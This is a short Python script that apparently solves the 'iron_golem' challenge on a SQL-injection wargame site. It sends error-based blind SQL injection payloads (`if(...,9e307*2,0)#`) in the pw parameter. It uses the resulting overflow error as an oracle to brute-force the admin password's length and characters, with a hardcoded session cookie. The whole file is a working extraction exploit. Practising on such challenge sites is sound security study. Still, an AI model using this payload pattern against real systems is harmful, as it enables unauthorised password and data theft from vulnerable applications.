import requests
from string import ascii_letters, digits

string = ascii_letters + digits
url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
cookie = {"PHPSESSID":"7f8oh5t259q5bg6j8qmc3v671f"}
default = "' or id=\"admin\" and if("
GET = lambda params, msg="(9e307 * 2)":requests.get(url,params,cookies=cookie).text.find(msg) > 0

length = 0
while True:
    if GET({"pw" : default + f"length(pw)={length},9e307*2,0)#"}):break
    length += 1
    
pw = ""
for i in range(1, length+1):
    for j in string:
        if GET({"pw" : default + f"mid(pw,{i},1)='{j}',9e307*2,0)#"}):
            pw += j
            break

if GET({"pw":pw}, "Clear!"): print("[*] Success")
